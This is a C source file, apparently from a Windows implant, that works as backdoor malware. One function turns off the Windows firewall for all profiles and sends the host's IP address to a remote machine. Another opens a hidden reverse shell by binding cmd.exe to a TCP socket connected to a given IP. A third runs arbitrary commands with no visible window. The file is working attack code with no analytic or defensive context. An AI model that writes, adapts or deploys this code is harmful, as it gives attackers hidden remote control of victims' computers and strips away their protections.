#include "femtocell.h"

extern struct sockaddr_in* localaddr;

void ping(char* ip)
{
	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in hax;

	wSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	system("netsh adv set allprofiles state off");

	hax.sin_family = AF_INET;
	hax.sin_port = htons(PING_PORT);
	hax.sin_addr.s_addr = inet_addr(ip);
	//char* data = (char*)malloc(16);
	//memset(data, 0, 16);

	char* data = inet_ntoa(localaddr->sin_addr);

	int len = sendto(wSock, data, 16, 0, (struct sockaddr*)&hax, sizeof(hax));
	closesocket(wSock);

	//free(data);
	//free(ip);
}

void rev(char* ip)
{
	WSADATA wsaData;
	SOCKET wSock;
	struct sockaddr_in hax;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(REV_PORT);
	hax.sin_addr.s_addr = inet_addr(ip);

	if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL))
	{
#ifdef _DEBUG
		printf("WSAConnnect Failed");
#endif
		free(ip);
		return;
	}

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;

	if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
#ifdef _DEBUG
		printf("CreateProcess failed (%d).\n", GetLastError());
#endif
		WaitForInputIdle(pi.hProcess, INFINITE);
		free(ip);
		return;
	}
	WaitForSingleObject(pi.hProcess, INFINITE);
	free(ip);
}

void exec(char* cmd)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
	{
#ifdef _DEBUG
		printf("CreateProcess failed (%d).\n", GetLastError());
#endif
		WaitForInputIdle(pi.hProcess, INFINITE);
		free(cmd);
		return;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	free(cmd);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
